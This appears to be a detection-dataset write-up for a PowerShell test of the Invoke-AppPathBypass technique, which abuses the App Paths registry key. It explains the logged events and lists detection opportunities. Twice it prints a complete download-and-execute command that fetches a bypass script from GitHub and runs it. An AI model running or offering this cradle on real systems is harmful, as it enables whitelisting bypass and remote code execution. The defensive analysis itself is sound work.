# T1059.001-5: PowerShell — Invoke-AppPathBypass

## Technique Context

T1059.001 (PowerShell) executes Invoke-AppPathBypass, a technique from the PowerSploit framework that manipulates the Windows App Paths registry key to redirect execution. The App Paths mechanism (`HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\`) allows per-user registration of application execution paths — when a program is launched by name, Windows checks this key. By writing a controlled value under this key that points to `cmd.exe` or another executable, an attacker can cause legitimate application launchers (like `Start-Process`) to execute an arbitrary binary, bypassing application whitelisting controls that check process lineage rather than registry state.

The specific invocation is:
```
"cmd.exe" /c Powershell.exe "IEX (New-Object Net.WebClient).DownloadString(
'https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/
a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1');
Invoke-AppPathBypass -Payload 'C:\Windows\System32\cmd.exe'"
```

This is a download-cradle pattern (like test 3 and test 19) but with `cmd.exe` as the outer wrapper, which means the process chain is `powershell.exe → cmd.exe → powershell.exe` rather than a direct PowerShell spawn. Detection focuses on: registry writes to `HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\`, unexpected `cmd.exe` spawned from PowerShell, download cradles in PowerShell executed via cmd.exe, and the specific bypass technique's behavioral markers.

In defended environments, Defender terminates with `STATUS_ACCESS_DENIED` (0xC0000022). This dataset captures the undefended execution.

## What This Dataset Contains

Security EID 4688 records `cmd.exe` executing from PowerShell with the complete download-and-execute command line:

```
"cmd.exe" /c Powershell.exe "IEX (New-Object Net.WebClient).DownloadString(
'https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/
a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1');
Invoke-AppPathBypass -Payload 'C:\Windows\System32\cmd.exe'"
```

Two `whoami.exe` processes from PowerShell are also captured. The absence of additional processes (no `cmd.exe` spawned by the payload, no evidence of the registry manipulation completing) suggests the download-and-execute succeeded but the redirect itself may not have triggered visibly within the observation window.

The PowerShell channel has 96 events (93 EID 4104, 2 EID 4100, 1 EID 4103). The 93 4104 blocks include the Invoke-AppPathBypass module content as downloaded from GitHub.

Sysmon contributes 14 events across EIDs 7, 1, 10, 17, and 8 — the smallest sysmon count in this test series so far, suggesting limited process spawning from the payload. EID 1 captures two `whoami.exe` instances. EID 8 shows PowerShell (PID 4628) creating a remote thread in an unknown process (PID 3332, `TargetImage: <unknown process>`, `StartAddress: 0x00007FF7F015F8F0`) — note the different start address from tests 18 and 4, suggesting this may vary by execution context. EID 10 shows full-access handle opens (0x1FFFFF) from PowerShell to both `whoami.exe` instances.

Compared to the defended version (26 sysmon, 9 security, 41 powershell events), the undefended version has fewer sysmon events (14) but more powershell events (96) and fewer security events (3 vs 9). The defended version's higher security count reflects the access-denied termination events recorded there. The undefended version's 96 powershell events contain the downloaded Invoke-AppPathBypass module.

## What This Dataset Does Not Contain

No Sysmon EID 13 (RegistryEvent) capturing the `HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\` write — this is the core action of the bypass technique and its absence means the dataset does not directly document the bypass mechanism. No EID 3 network events for the download. No evidence that the redirected executable (`C:\Windows\System32\cmd.exe` as the payload) actually launched via the bypass path.

The dataset documents the setup and the download, but not the registry-manipulation and execution-redirection that are the technique's defining characteristic.

## Assessment

Like test 4, this dataset's primary detection value lies in the EID 4688 command line and the 4104 script blocks. The download cradle here is wrapped in `cmd.exe /c Powershell.exe "IEX ..."` rather than a direct PowerShell invocation, which produces a slightly different process chain: `powershell.exe → cmd.exe → powershell.exe`. The URL, function name (`Invoke-AppPathBypass`), and payload (`C:\Windows\System32\cmd.exe`) all appear in the command line.

The missing registry events limit the dataset's utility for detecting the bypass mechanism itself, but the download-cradle-via-cmd pattern and the EID 8 injection indicator are well-represented.

## Detection Opportunities Present in This Data

1. EID 4688 with `cmd.exe /c Powershell.exe "IEX (New-Object Net.WebClient).DownloadString(..."` — a download cradle wrapped in cmd.exe, producing the `powershell → cmd → powershell` process chain.
2. EID 4688 URL `raw.githubusercontent.com/enigma0x3/` — a known research repository associated with bypass techniques.
3. EID 4688 containing `Invoke-AppPathBypass -Payload 'C:\Windows\System32\cmd.exe'` — the specific bypass function and payload target in the command line.
4. Sysmon EID 1 showing `cmd.exe` as a direct child of `powershell.exe` — an unusual parent-child relationship warranting review when the cmd.exe command line contains a download cradle.
5. Sysmon EID 8 from `powershell.exe` to `<unknown process>` — CreateRemoteThread with unresolved target.
6. EID 4104 containing the Invoke-AppPathBypass module — the downloaded script captured in memory without a file artifact.
7. EID 4688 with `powershell.exe` spawning `whoami.exe` before and after a download-cradle execution — system identity checks flanking an offensive operation.
